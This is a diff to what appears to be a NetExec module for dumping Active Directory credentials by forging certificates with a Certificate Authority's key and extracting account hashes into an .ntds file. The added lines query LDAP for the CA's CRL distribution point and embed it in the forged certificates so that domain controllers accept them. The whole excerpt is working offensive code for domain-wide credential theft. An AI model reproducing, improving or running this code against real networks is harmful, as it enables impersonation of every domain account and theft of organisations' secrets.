@@ -65,7 +65,9 @@ class NXCModule:
         outfile = f"{output_filename}.ntds"
 
         context.log.success("Forging certificates and UnPACing the hashes, this could take a while so go grab a redbull...")
-        forger = Forge()
+        # Like certsync, add the CA CRL distribution point: without it some KDCs reject the forged certificates
+        crl = parse_result_attributes(connection.search(f"(&(objectClass=cRLDistributionPoint)(name={ca_cert.subject.get_attributes_for_oid(NameOID.COMMON_NAME)[0].value}))", ["distinguishedName"], baseDN=f"CN=CDP,CN=Public Key Services,CN=Services,{connection.configuration_context}"))
+        forger = Forge(crl=crl[0]["distinguishedName"] if crl else None)
         user_key = generate_rsa_key(2048)  # one throwaway key reused for every account: the keygen is the slow part
         dumped = added = 0
         with open(outfile, "w") as results:
